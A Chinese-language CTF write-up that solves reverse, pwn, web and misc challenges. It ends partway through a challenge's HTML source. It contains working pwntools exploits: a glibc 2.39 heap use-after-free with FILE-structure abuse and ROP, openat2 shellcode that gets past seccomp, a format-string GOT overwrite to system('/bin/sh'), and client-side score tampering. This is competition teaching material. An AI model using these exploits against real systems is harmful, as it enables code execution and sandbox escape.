# Reverse题解

## s1gn1n

在字符串列表看到一个base64的字符串，交叉引用就能到主要加密函数，大概的逻辑就是输出字符串，然后将它链表化，中序遍历，然后将中序遍历的结果进行base64编码，然后有个异或，最后就是求和判断返回值是否为零，为零就正确
```python
import base64
from typing import Optional, List, Dict

def get_left_count(n: int) -> int:
    """精确计算完全二叉树左子树节点数"""
    if n <= 0:
        return 0
    h = 1
    while (2 ** (h) - 1) < n:  # 修正高度计算逻辑
        h += 1
    h -= 1  # 实际高度
    last_level = n - (2 ** h - 1)
    left_max = 2 ** (h - 1) if h >= 1 else 0
    left_actual = min(last_level, left_max)
    total = (2 ** (h) - 1) // 2 + left_actual
   #print(f"get_left_count(n={n}) h={h}, last_level={last_level}, left_max={left_max}, left_actual={left_actual}, return {total}")
    return total

def build_level_map(in_order: str, start: int, end: int, level_pos: int, level_map: Dict[int, str], depth=0):
    if start > end:
        #print(f"  {'  '*depth}start={start} > end={end}, return")
        return
    n = end - start + 1
    left_size = get_left_count(n)
    root_pos = start + left_size
   # print(f"{'  '*depth}build_level_map: start={start}, end={end}, n={n}, left_size={left_size}, root_pos={root_pos}, level_pos={level_pos}")
    
    # 边界检查
    if root_pos < start or root_pos > end:
        #print(f"  {'  '*depth}Invalid root_pos={root_pos}, start={start}, end={end}")
        return
    
    level_map[level_pos] = in_order[root_pos]
   # print(f"  {'  '*depth}Mapped level_pos={level_pos} -> char '{in_order[root_pos]}'")
    
    # 递归左子树
    build_level_map(in_order, start, root_pos-1, 2*level_pos+1, level_map, depth+1)
    # 递归右子树
    build_level_map(in_order, root_pos+1, end, 2*level_pos+2, level_map, depth+1)

def in_order_to_level_order(in_order_str: str) -> str:
    level_map: Dict[int, str] = {}
    build_level_map(in_order_str, 0, len(in_order_str)-1, 0, level_map)
    #print("\n层序映射表:", level_map)
    
    if not level_map:
        return ''
    max_index = max(level_map.keys())
    level_order = []
    for i in range(max_index + 1):
        level_order.append(level_map.get(i, ''))
    # 删除末尾的空字符串
    while level_order and level_order[-1] == '':
        level_order.pop()
    return ''.join(level_order)

class Node:
    def __init__(self, value: str):
        self.value = value
        self.left: Optional[Node] = None
        self.right: Optional[Node] = None

def build_tree_from_level_order(level_order: List[str]) -> Optional[Node]:
    if not level_order:
        return None
    root = Node(level_order[0])
    queue = [root]
    i = 1
    while queue and i < len(level_order):
        current = queue.pop(0)
        # 处理左子节点
        if i < len(level_order) and level_order[i]:
            current.left = Node(level_order[i])
            queue.append(current.left)
        i += 1
        # 处理右子节点
        if i < len(level_order) and level_order[i]:
            current.right = Node(level_order[i])
            queue.append(current.right)
        i += 1
    return root

def in_order_traversal(root: Optional[Node], result: List[str]):
    if root:
        in_order_traversal(root.left, result)
        result.append(root.value)
        in_order_traversal(root.right, result)



XOR_DATA = [
    0x58, 0x69, 0x7B, 0x06, 0x1E, 0x38, 0x2C, 0x20, 0x04, 0x0F, 0x01, 0x07, 0x31, 0x6B, 0x08, 0x0E,
    0x7A, 0x0A, 0x72, 0x72, 0x26, 0x37, 0x6F, 0x49, 0x21, 0x16, 0x11, 0x2F, 0x1A, 0x0D, 0x3C, 0x1F,
    0x2B, 0x32, 0x1A, 0x34, 0x37, 0x7F, 0x03, 0x44, 0x16, 0x0E, 0x01, 0x28, 0x1E, 0x68, 0x64, 0x23,
    0x17, 0x09, 0x3D, 0x64, 0x6A, 0x69, 0x63, 0x18, 0x18, 0x0A, 0x15, 0x70
]
char_list = []  
char_list.append(chr(XOR_DATA[0])) 
for j in range(1, len(XOR_DATA)):  
    XOR_DATA[j]=XOR_DATA[j] ^ XOR_DATA[j - 1]
    char_list.append(chr(XOR_DATA[j] ))  

result = ''.join(char_list) #X1JLRjFfbmlkZ197MG5GaV9pQGVycnRMfTNzM21ucmlDZ2VubkV2X1RJRXM=
#print(result)  
dec = base64.b64decode(result)
#print(dec)
#b'_RKF1_nidg_{0nFi_i@errtL}3s3mnriCgennEv_TIEs'
dec ="_RKF1_nidg_{0nFi_i@errtL}3s3mnriCgennEv_TIEs"
a1 = in_order_to_level_order(dec)
print(a1)
#miniLCTF{esrevER_gnir33nignE_Is_K1nd_0F_@rt}

```

# Pwn题解

## easy heap

菜单堆题，防护开的比较齐全，看了一眼glibc版本，2.39，之前最高打过2.35，隐约感觉可能会打IO，扫一眼所有的选项，add函数通过fgets进行输入（最难受的地方，这个添加\x00恶心坏了）,然后size和ptr都保存在bss段的一个结构体数组上，edit同样是通过fgets进行输入，然后看delete函数，重点观察有没有可以创造UAF的地方，能看到这里delete只是清除了结构体数组中的size，这里ptr是一个局部变量，实际存储的并没有清除，所以数组中仍然残留之前的指针，然后看show，输出函数感觉重点看输出形式，这里采用的是%s，那就要注意\x00的截断问题，开始考虑的是看能不能off by one，结果发现，fgets函数不仅补\x00，而且还给他预留位置，这个\x00是污染不到下一个chunk的，所以这里主要关注这个ptr不清零问题，既然他保留指针，而且他的delete只关注当前结构体指针的ptr，并没有验证size，所以这里可以创造UAF，通过创造chunk0，然后delete掉，之后申请一个同样大小的，就会把之前的这个chunk申请回来，并且存放在ptrlist[1]，此时可以再次释放chunk0，就可以通过ptrlist[1]进行UAF，剩下的，原本想的是看能不能板子一样的去泄露libc的env，然后泄露栈，然后打ROP，结果，又被fgets恶心了，无法泄露，可恶，在fgets反复栽跟头，（这里还有一个坑，最开始尝试通过任意分配泄露env的方案偷懒没有删，结果导致一个\x00溢出到了env，导致后面打的时候，栈偏移一直在变，可恶，屎山代码作祟）然后看了2.39的网上大多数帖子，发现大多数都在打IO，于是了解了Apple2，主要是通过劫持了IO file的vtable，于是，我开始尝试打Apple2，首先通过创造unsorted chunk来泄露libc基址，看到网上有打`svcudp_reply` 这个函数的，但是好像2.39没有找到这个函数，而且2.39的`setcontext`函数变成了rdx了，也不是很好利用，之后看到了另一个帖子，通过打stderr的IO_wfile这个宽字符跳表，先更改_IO_list_all指向我们的一个fake heap，fake heap我选择创建在了heap_base + 0x2000(防止前面创建的chunk覆盖到这里，选取了一个高地址，而且这样的话，地址比较好记，方便后面利用)，最后成功修改了IO_woverflow的跳转地址，但是此时出现了一个问题，就是只能执行一条指令，可以做栈迁移，但是扫了一大圈没有发现合适的gadget，执行one gadget发现也跟hint一样，这个题不是只限制了oepn和openat，execve也被限制了，所以这条路只能到这了，后续了解到还可以去通过stdout的write_base和end来进行地址的泄露，于是将这两个设置为env和env+8，将flag设置为0xfbad1800，就可以泄露栈地址，剩下的就是ROP或者说其他手段了，因为这里限制了open，而且rdx的控制的gadget真的不好用，于是打ret2shellcode，在之前的那个高地址读入shellcode，然后通过ROP调用mprotect将这一片区域增加可执行权限，shellcode的写法主要是通过SYS_openat2这个系统调用进行沙箱的绕过，最后就可以成功ORW flag了

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')
# p = process('./vuln')
# p = gdb.debug('./vuln','b $rebase(0x191f)')
p = remote('172.27.80.1',62893)
libc = ELF('./libc.so.6')
def demangle(ptr):
    mid = ptr ^ (ptr >> 12)
    return mid ^ (mid >> 24)
def add(p, index, size, data):
    p.recvuntil(b'Choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Input data:')
    p.sendline(data)
def delete(p, index):
    p.recvuntil(b'Choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
def edit(p, index, data):
    p.recvuntil(b'Choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Input new data: ')
    p.sendline(data)
def show(p, index):
    p.recvuntil(b'Choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
def create_chunk(p,index,size,addr):
    #保证有足够的tcache bins
    add(p,index,size,b'a')
    add(p,index+1,size,b'a')
    add(p,index+2,size,b'a')
    add(p,index+3,size,b'a')
    delete(p,index)
    delete(p,index+1)
    delete(p,index+2)
    delete(p,index+3)
    add(p,index,size,b'a')
    delete(p,index)
    add(p,index+1,size,b'a')
    delete(p,index)
    #现在index+1和index指向同一个方向
    show(p,index+1)
    p.recvuntil(b'Data: ')
    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
    heap_leak = demangle(heap_leak)
    mangle = (heap_leak >> 12) ^ (addr)
    edit(p,index+1,p64(mangle))
    add(p,index+2,size,b'data')
    add(p,index+3,size,b'newchunk')
    #现在index+3就是新的地址
def create_chunk2(p,index,data,size,addr):
    #保证有足够的tcache bins
    add(p,index,size,b'a')
    add(p,index+1,size,b'a')
    add(p,index+2,size,b'a')
    add(p,index+3,size,b'a')
    delete(p,index)
    delete(p,index+1)
    delete(p,index+2)
    delete(p,index+3)
    add(p,index,size,b'a')
    delete(p,index)
    add(p,index+1,size,b'a')
    delete(p,index)
    #现在index+1和index指向同一个方向
    show(p,index+1)
    p.recvuntil(b'Data: ')
    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
    heap_leak = demangle(heap_leak)
    mangle = (heap_leak >> 12) ^ (addr)
    edit(p,index+1,p64(mangle))
    add(p,index+2,size,b'data')
    add(p,index+3,size,data)
def create_chunk3(p,index,data,size,addr):
    #保证有足够的tcache bins
    add(p,index,size,b'a')
    add(p,index+1,size,b'a')
    add(p,index+2,size,b'a')
    add(p,index+3,size,b'a')
    delete(p,index)
    delete(p,index+1)
    delete(p,index+2)
    delete(p,index+3)


one_gadget_list = [0x583ec,0x583f3,0xef4ce,0xef52b]

add(p,0, 0x90, b'A')
delete(p,0)
add(p,1, 0x90, b'B')
#此时0和1的ptr都指向同一个chunk，出现了指针的复用
for i in range(7):
    add(p,i+2,0x90,b'deadbeef')
for i in range(7):
    delete(p,i+2)
#此时如果再释放掉0，那么他会变成libc的地址
delete(p,0)
#此时1仍然保留长度和指针
pause()
show(p,1)
p.recvuntil(b'Data: ')
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
print('----------------libc_leak:', hex(libc_leak))
libc_base = libc_leak - 0x203b20
print('----------------libc_base:', hex(libc_base))
one_gadget = libc_base + one_gadget_list[2]
system = libc_base + libc.symbols['system']
pop_rdi = libc_base + 0x10f75b
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()
environ = libc_base + libc.symbols['environ']
# svcudp_reply = libc_base + libc.symbols['svcudp_reply']
swapcontext = libc_base + 0x580c0
setcontext=libc_base+libc.sym['setcontext']+61
ret_add = libc_base + 0x000000000002882f
leave_ret = libc_base + 0x00000000000299d2
stderr = libc_base + 0x2044e0
_IO_list_all  = libc_base + libc.symbols['_IO_list_all']
_IO_wfile_jumps = libc_base + 0x202228

print('----------------environ:', hex(environ))

add(p,9,0x60,b'a')
delete(p,9)
add(p,10,0x60,b'a')
delete(p,9)
#9和10公用一个指针，打印一下10
show(p,10)
p.recvuntil(b'Data: ')
heap_leak1 = u64(p.recv(6).ljust(8, b'\x00'))
print('heap leak orign = = = = = = ',hex(heap_leak1))
heap_leak1 = demangle(heap_leak1)
print('----------------heap_leak:', hex(heap_leak1))
heap_base = (heap_leak1 >> 12) << 12
print('----------------heap_base:', hex(heap_base))

fake_heap = heap_base + 0x4000
fake_heap2 = heap_base + 0x4240
heap1 = fake_heap + 0x88
print('environ-8:',hex(environ-8))
mangle1 = (heap_leak1 >> 12) ^ (environ-24)
print('--------mangle1',hex(mangle1))
edit(p,10,p64(mangle1))
add(p,11,0x60,b'deadbeef')


create_chunk(p,13,0x200,fake_heap)
#16指向了第一个fakeheap
create_chunk(p,17,0x210,fake_heap2)
#20指向第二个
stack_over = libc_base + 0x202240
#尝试打io

std_out = libc_base + 0x2045c0
payload = flat({
    0x00: p64(0xfbad1800),
    0x08: p64(0) * 3,
    0x20: p64(environ) + p64(environ + 8)
    # 0x40: p64(stderr_pad + 1),
    # 0x48: b'\x00' * 32,
    # 0x68: p64(std_out),
    # 0x70: p64(2),
    # 0x78: p64(0xffffffffffffffff),
    # 0x80: p64(0),
    # 0x88: p64(libc_base + 0x205700),
    # 0x90: p64(0xffffffffffffffff),
    # 0x98: p64(0),
    # 0xa0: p64(fake_heap),
    # 0xa8: p64(fake_heap) + b'\x00' * 16,
    # 0xc0: p64(1),
    # 0xc8: b'\x00' * 16,
    # 0xd8: p64(_IO_wfile_jumps-0x40) + p64(0xfbad2087) + pad
})
create_chunk2(p,21,payload,0x150,std_out)
stack_leak = u64(p.recvuntil(b'Item added')[-18:-10])
# stack_leak = u64(p.recv(8).ljust(8, b'\x00'))
print('stack leak----------------',hex(stack_leak))
#24指向了stderr-16
stderr_pad = stderr + 131
shell = asm('''
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    push 0
    push 0
    push 0
    mov rdx, rsp
    mov r10, 0x18
    push SYS_openat2
    pop rax
    syscall
    push 3
    pop rdi
    push 0xFF 
    pop rdx
    mov rsi, rsp
    push SYS_read
    pop rax
    syscall  
    push 1
    pop rdi
    push 0xFF  
    pop rdx
    mov rsi, rsp
    push SYS_write
    pop rax
    syscall

''')

payload2orw = b'/flag\x00\x00\x00'
payload2orw += shell
payload2orw += b'\x00'
#加一个\x00对齐，另外隔断开换行符，以防导致指令出问题
print('len of shell',len(shell))
edit(p,16,payload2orw)
#fake_heap现在有/flag,然后+8是shellcode
payload2 = b'\x00' * 0x68 + p64(system)
edit(p,20,payload2)
#0x110到main的rbp
print('ret add = ',hex(stack_leak - 0x110))


create_chunk3(p,26,p64(0xdeadbeef) + p64(fake_heap+8),0x80,fake_heap+16)
#实验为什么出问题
add(p,26,0x90,b'a')
delete(p,26)
add(p,27,0x90,b'a')
delete(p,26)
#现在index+1和index指向同一个方向
show(p,27)
p.recvuntil(b'Data: ')
heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
print('--------------before------------------',hex(heap_leak))
heap_leak = demangle(heap_leak)
print('--------------------------------',hex(heap_leak))
mangle = (heap_leak >> 12) ^ (stack_leak-0x138)
edit(p,27,p64(mangle))

add(p,28,0x90,b'data')
print('---------------------stack over-----------',hex(stack_leak-0x120))
pop_rsi = libc_base + 0x0000000000110a4d
pop_rbx = libc_base + 0x0586e4
mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp_ret = libc_base + 0xb0133
mprotect = libc_base + libc.symbols['mprotect']

payload = p64(1)+p64(pop_rdi) + p64(heap_base + 0x4000) 
payload += p64(pop_rbx) + p64(7) 
payload += p64(mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp_ret)
payload += p64(1) + p64(1) + p64(stack_over)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(mprotect)
payload += p64(fake_heap+8)
pause()
add(p,29,0x90,payload)


p.recvuntil(b'Choice: ')
pause()
p.sendline(b'5')
#触发返回

p.interactive()
edit(p,28,p64(0xdeadbeef) + p64(stack_leak-0x98))
#系统调用号是10 mprotect

#似乎不好mprotect
print('one_gadget  ----------------------',hex(one_gadget))
print('fakechunk1--------------',hex(fake_heap))
print('fakechunk2--------------',hex(fake_heap2))
print('_IO_wfile_jumps',hex(_IO_wfile_jumps))
print('IO stderr ----------',hex(stderr))
p.interactive()

```

## postbox

先看防护，Partial RELRO，所以有可能可以打GOT，之后看，程序里存在system('/bin/sh')，但是那个函数叫invalid，估计不靠谱，主函数读入了一个text，open的模式是O_WRONLY | O_CREAT，PostMessage函数读入了一个次数，然后将输入的内容读入到txt文件中，这里输入长度无法溢出，PostScript函数参数一个是次数，一个是输入长度（128），当v4是114514的话，会将读入长度增加127，并且这里有一个很明显的格式化字符串漏洞，所以看这个函数的框架，这里就是想让我们打格式化字符串，但是这个函数并没有看到能更改v4的地方，于是考虑会不会出现栈的复用，因此我去观察了一下栈，发现果然，选项2的PostMessage和PostScript的函数栈是有重合部分的，所以，通过message函数可以在对应的位置填写v4，以此调用后面的if内容，前面postbox函数里他每次调用之前，我发现都保留了地址在栈上，结合这里的格式化字符串问题，就想到，基本就是方便我们利用的了，可以直接在栈上找到我们要更改的地址，通过格式化字符串，可以直接更改次数和长度，以此我们能不断进入这个函数进行格式化字符串，寻找对应的参数在栈上偏移，通过fmt_strpayload更改got表就可以了（在此之前要通过%p先泄露elf加载基址），这里我还试了一下直接控制执行流到那个invalid函数，果然是不成功，大概率就是因为对齐问题了，笑死

```
from pwn import *
context(arch='amd64', log_level='debug', os='linux')
# p = process('./postbox')
p = remote('172.27.80.1',62195)
elf = ELF('./postbox')
# p = gdb.debug('./postbox', 'b postBox')
p.recvuntil(b'ive me your choice:\n')
p.sendline(b'2')
p.recvuntil(b'contents:\n')
payload1 = b'a'* 0x2fc + p32(114514)
pause()
p.send(payload1)
p.recvuntil(b'contents:\n')
payload2 = b'%15c%49$hhn'
# payload2 = b'%48$p-%49$p'
pause()
p.send(payload2)
#%13$p能泄露main的地址，因此得到了程序的加载基址，之后就能得到got表的地址了
payload3 = b'%13$p'
p.send(payload3)
# p.interactive()
p.recvuntil(b'Your words:\n\n')
p.recvuntil(b'0x')
main_add = int(p.recv(12), 16)
print('main_add:', hex(main_add))
base = main_add - elf.symbols['main']
printf_got = base + elf.got['printf']
print('printf_got:', hex(printf_got))
system = base + elf.symbols['system']
print('system:', hex(system))
invalid = base + 0x177e
payload = fmtstr_payload(10,{printf_got:system},write_size='short')
print('--------------------------')
pause()
p.send(payload)
p.recvuntil(b'contents:\n')
p.send(b'/bin/sh\x00')
#这一次将那个main修改为got表的地址
# printf(got)
p.interactive()
```

## Ex-Aid lv.2

先看保护，仍然是可以更改got表，然后存在3次malloc，感觉可能就是单纯让打栈了，后续程序逻辑主要是更改了申请的堆的权限，然后将堆当成函数执行了，这肯定是打shellcode，然后执行然后看了一眼seccomp tools，发现禁用了execve，execveat，mprotect，pkey_mprotect，3个0x18大小的堆，估计就是考shellcode的编写能力了，而且肯定要注意一下怎么将三个块连起来，所以这里编写思路是通过jmp指令进行跳转，然后就是不断的修修剪剪压缩，压缩手段主要是

1. 将64位寄存器更改为32位的，这样会减少指令前面的一个0x48（好像是这个？记不清了，就记得pwn college有一节考过这个，是标记当前指令操作的寄存器是64位的）

2. 将一些mov指令更改为push pop

   最开始的时候想通过的rip相对寻址来跳转，然后发现长度有点长，后面经过搜索发现了jmp $，也是一个相对跳转指令，跳转到当前指令偏移x处，然后就是第一个指令open，第二个read，第三个write一套经典的ORW连招

```
from pwn import *
context(arch='amd64', log_level='debug', os='linux')
# p = process('./checkin')
p = gdb.debug('./checkin', '''
            b *main+326''')
p = remote('172.27.80.1',57091)
sh = shellcraft
# payload = asm(sh.execve('/bin/sh', 0, 0))
# print('len ----------',len(payload))
# p.send(payload)
payload1 = asm('''
xor eax, eax
mov rdi, 0x67616c662f
push rdi
mov rdi, rsp
xor esi, esi
mov al, 2 
syscall
jmp $+10           
''')
payload2 = asm('''
push 3
pop rdi
xor eax,eax
mov rsi,rsp
mov edx,0x50
syscall
lea rax, [rip+10]
jmp rax 
               ''')
payload3 = asm('''
mov rdi,1
mov eax,1
mov rsi,rsp
mov rdx,0x100
syscall
               ''')
print('len ----------',len(payload1))
print('len ----------',len(payload2))
print('len ----------',len(payload3))
p.send(payload1)

p.send(payload2)
p.send(payload3)
p.interactive()
```

## **MmapHeap**

熬了好久干出来的一道题，凌晨3点干出来的，我哭死，燃尽了，仍然先看保护，Partial RELRO，然后没有canary，然后来看程序的逻辑，并且，这一个题是一个自制的libc库，并不是glibc（第一次打），那就要ida审一下他的libc库了，看一下他的分配器是怎么工作的，审完之后，他的主要逻辑是这样的，malloc会首先check你的size，主要检测对齐和是不是0（没有检测负数溢出问题），然后这里有一个类似于tcache的那个struct一样的管理结构，它是通过一个头节点进行管理，它的数据结构是

```
struct node_header {
  void* chunk_start;     // v4[0]     → v4 + 6 usrdata起始位置
  void* num;          // v4[1]   → 计数器,记录当前分配了多少个，如果归零的话，会将这个mmap页面munmap
  void* base;            // v4[2]   → v4
  void* end;             // v4[3]   → v4 + len
  void* prev;            // v4[4]    双向链表，好像是这个是next和prev都可以，但是尾插法有点别扭，所以这里当成头插法比较符合tcache的那种插入方式
  void* next;            // v4[5]
}
```

它的chunk的结构是

```
struct chunk {
_int64 size;
chunk* next;
userdata
}
```



### malloc函数

malloc会进行一个遍历，寻找有没有符合要求的chunk，它这里并不是像tcache一样，将相同大小的chunk放到同一个bin，而是单纯的按照这个mmap的页面里还有没有符合自己申请大小的，就连free的时候，都是按照地址范围来进行页面的查询的，如果当前页面剩余的空余大小大于我们需要的，就会将这个chunk通过fetch函数进行分割，然后分配给我们，如果所有页面都已经不够了，就会新mmap一个，然后进行分割，

![](./image/mmap1.png)

能看到这个就是那个list head，因为只是一个头节点，所以只保留指针，前面的不需要就都是0



### fetch_chunk

如果当前的free chunk大小合适的话（如果剩余大小-我们的分配大小<=16,会把那16字节也一并给我们），如果空闲大小很大，就会进行分割，并且填写剩余的空间的size以及相关管理结构的指针等

### new_node_header

创建页面的一个函数，接收的参数是一个大小，在malloc的最下面有一个最小传入大小的设置，65548，这里的65583是65535 + 48，这个48其实就是页面前面的那6个管理结构元素，mmap之后，就是头部数据的初始化

```
 v4[2] = v4;                                   // start_add
 v4[3] = (char *)v4 + len;                     // end
 *v4 = v4 + 6;                                 // real chunk start，指向了真正的chunk部分
 v4[1] = 0LL;                                  // 计数器归零
 v4[4] = &list_head;                           // next指针指向了head
 v4[5] = qword_4048;                           // 是直接指向了head的prev指针，
                                                // 所以这一段其实就让新节点的prev指向了原本
```

并且更改list head的指针，将这个页面链入我们的管理结构

## free

传入了chunk的userdata地址，然后对于double free的检测是检查了size的最低bit的use位，然后通过地址范围寻找它该放入的页面，相当于一个合法地址范围检查吧，之后去除use位，然后就是更改各种指针，并且减少头部数据中那个count，然后以free chunk的身份，链入管理结构，不会进行合并

## free_node_header

就是双向链表的一个脱链结构，当这个页面所有chunk都被free掉，就会将当前页面释放，然后更改管理结构的链表，至此它的管理结构基本就已经捋完了

### 正式解题

看一下程序逻辑，add函数接收一个size，并且这里是没有对size的负数溢出检查，-1警告，然后他会在我们输入的数据末尾补\x00，这次的是可以off by one的，不像某函数（fgets），然后，将size和ptr都放入bss段的一个全局结构体数组，然后edit函数没啥好说的，同样存在这个off by one问题，之后是delete函数，重点关注能不能UAF，能看到这里检查了对应的ptr存在与否和index范围，然后free之后，清除了size和ptr，暂时看不到怎么UAF，继续看show函数，这里，通过puts进行输出，然后看load函数，主要是检查了输入路径中，是否存在flag字段，如果存在调用f_open，这里解题点就立马出来了，之前got表可写，这里如果更改掉他的got表，让他调用r_open就行了，后续就围绕这个做，这里目前看到的手段一个是off by one，一个是负数溢出问题，这个溢出，通过尝试，可以打印一些东西，用于泄露，然后这里反复尝试之后，决定打这个大的页面的off by one，通过溢出一个\00字节，会覆盖到页面管理结构里的那个指向当前第一个空闲空间的指针，这样会出现一些错位，这里我调试发现，原本末尾字节是0xf0，然后剩余空间是0x110，之后通过溢出，就变成了0x00，那么逻辑上剩余空间和我们已经分配的空间就有了重叠，可以通过前面分配的chunk，在对应位置填写size，这样就可以实现一个overlapping，可以任意覆盖下一个页面的管理结构，然后我通过大小为-1的chunk（要通过调试，让他正好处于最后0x10字节），但是他溢出的空间会导致一个\x00截断，导致不能泄露，这里我是通过free掉一个chunk重新覆盖了对应的区域，这样就可以泄露chunk的地址了，任意分配手段，主要是通过这个over lapping更改指向下一个空闲空间的指针，来实现任意分配，此时我们就得到了libc的地址（因为mmap的地址和他相对偏移是固定的，我记得这好像是aslr的等级原因？），之后泄露elf基址很愁人，想了很久，最后暴力搜，直接tele挨个地址段看，在ld段里发现了一个指针指向了elf段，此时怎么泄露是一个问题，因为我们的泄露其实有缺陷，前面的泄露是靠重新覆写地址，来覆盖掉\x00

![image-20250508164319810](image/image2.png)

所以这里找到一个连续指向elf的地址段，注意他在fetch页面之后，会将剩余空间的大小进行一个重新填写，所以如果我们分配一个-1size的chunk到28这里，就会把这0x55fa694c8350-0x10写到38那里，此时就可以泄露了，后面就随便改got拿下了

# web

## GuessOneGuess

首先审计源代码,发现

```
if (totalScore > 1.7976931348623157e308) {
                        message += `\n🏴 ${FLAG}`;
                        showFlag = true;
                    }
```

是获取flag的条件，又发现scoreDisplay.textContent 中的punishment-response作为扣除分数在前端可以发请求直接修改
控制台输入

```
const socket = io('ws://xxx');// xxx为环境地址
socket.on('connect', () => {
  socket.emit('punishment-response', {score: -1.8e308});
});
```

先发送请求设置data.score为-1.8e308,发现会有限制，于是改用字符串'-1.8e308'。
然后先猜错100次
再用二分法猜对一次即可获取flag

# Misc

## 吃豆人

连上环境后f12,发现脚本game.js:

```js
function startGame() {
    document.getElementById("start-screen").style.display = "none";
    document.getElementById("game").style.display = "block";
    initGame();
}

const canvas = document.getElementById("game");
const ctx = canvas.getContext("2d");
const box = 20;

let people, balls, score, dx, dy, isGameOver, game;
let redBallCount, blueBallCount;
let hasGotFlag = false;

function initGame() {
    people = [{ x: 200, y: 200 }];
    dx = box;
    dy = 0;
    score = 0;
    isGameOver = false;
    hasGotFlag = false;

    redBallCount = 1000;
    blueBallCount = 1;
    balls = [];

    spawnBalls();

    if (game) clearInterval(game);
    game = setInterval(draw, 150);
}

document.addEventListener("keydown", dir);

function dir(e) {
    if (e.key === "ArrowUp" && dy === 0) { dx = 0; dy = -box; }
    else if (e.key === "ArrowDown" && dy === 0) { dx = 0; dy = box; }
    else if (e.key === "ArrowLeft" && dx === 0) { dx = -box; dy = 0; }
    else if (e.key === "ArrowRight" && dx === 0) { dx = box; dy = 0; }
    else if (e.key === " ") {  // 空格重开
        initGame();
    }
}

function draw() {
    if (isGameOver) return;

    ctx.clearRect(0, 0, 400, 400);
    ctx.strokeStyle = "white";
    ctx.lineWidth = 2;
    ctx.strokeRect(0, 0, 400, 400);

    // ren
    ctx.fillStyle = "lime";
    ctx.fillRect(people[0].x, people[0].y, box, box);

    // 画球
    balls.forEach(ball => {
        ctx.fillStyle = ball.color;
        ctx.beginPath();
        ctx.arc(ball.x + box / 2, ball.y + box / 2, box / 2 - 2, 0, Math.PI * 2);
        ctx.fill();
    });

    // 人移动
    let head = { x: people[0].x + dx, y: people[0].y + dy };

    // 碰撞判断
    if (head.x < 0 || head.x >= 400 || head.y < 0 || head.y >= 400) {
        gameOver();
        return;
    }

    // 吃球逻辑
    let ateIndex = balls.findIndex(b => b.x === head.x && b.y === head.y);
    if (ateIndex !== -1) {
        const eaten = balls[ateIndex];
        if (eaten.color === "red") {
            score += 1;
            redBallCount--;
        } else if (eaten.color === "blue") {
            score = score * 5;
            blueBallCount--;
        }
        balls.splice(ateIndex, 1);
    }

    people[0] = head;

    // 胜利检测
    if (score >= 5000 && !hasGotFlag) {
        fetch('/submit_score', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ score: score })
        })
            .then(response => response.json())
            .then(data => {
                if (data.flag) {
                    alert("🎉 恭喜！你的flag是：" + data.flag);
                } else {
                    alert("未达到指定分数！");
                }
            });
        hasGotFlag = true;
    }

    // 球吃光了
    if (balls.length === 0) {
        if (redBallCount === 0 && blueBallCount === 0) {
            if (score >= 5000) {
                alert("你赢了！");
            } else {
                alert("球全吃完了，但分数不足，游戏失败！");
            }
            isGameOver = true;
            return;
        } else {
            spawnBalls();
        }
    }

    if (
        redBallCount > 0 &&
        balls.every(b => b.color !== "red") &&
        balls.length > 0
    ) {
        spawnBalls();
    }

    ctx.fillStyle = "white";
    ctx.fillText("Score: " + score, 10, 20);
    ctx.fillText("Red left: " + redBallCount, 10, 40);
    ctx.fillText("Blue left: " + blueBallCount, 10, 60);
}

function spawnBalls() {
    let num = Math.floor(Math.random() * 5) + 1;

    // 即使红球或蓝球库存为 0，也要刷新蓝球位置（如果还在场上）
    const blueIndex = balls.findIndex(b => b.color === "blue");
    if (blueIndex !== -1) {
        balls.splice(blueIndex, 1);
    }

    if (redBallCount <= 0 && blueBallCount <= 0) return;

    // 特例：只生成一个球
    if (num === 1) {
        if (redBallCount > 0) {
            balls.push(createBall("red"));
        } else if (blueBallCount > 0) {
            balls.push(createBall("blue"));
        }
        return;
    }

    // 多于1个球时，先加蓝球（前提：蓝球还未被吃掉）
    if (blueBallCount > 0) {
        balls.push(createBall("blue"));
        num--;
    }

    // 加红球（前提：库存足够）
    while (num > 0 && redBallCount > 0) {
        balls.push(createBall("red"));
        num--;
    }
}

function createBall(color) {
    let x, y;
    do {
        x = box * Math.floor(Math.random() * 20);
        y = box * Math.floor(Math.random() * 20);
    } while (balls.some(b => b.x === x && b.y === y) || (people[0].x === x && people[0].y === y));
    return { x, y, color };
}

function gameOver() {
    alert("你撞墙了，游戏失败！得分：" + score + "\n按空格键重新开始");
    isGameOver = true;
}

// 启动
//initGame();
```

看下面这一段：

```js
if (score >= 5000 && !hasGotFlag) {
    fetch('/submit_score', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ score: score })
    })
```

只要满足score>=5000就能获取 flag

控制台输入以下命令即可：

```
score = 5000;
```

## 麦霸评分

审查代码：

```js
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>f4k3 KTY 评分系统</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #e74c3c;
            margin-bottom: 10px;
        }
        .controls {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        .button {
            padding: 12px 25px;
            font-size: 16px;
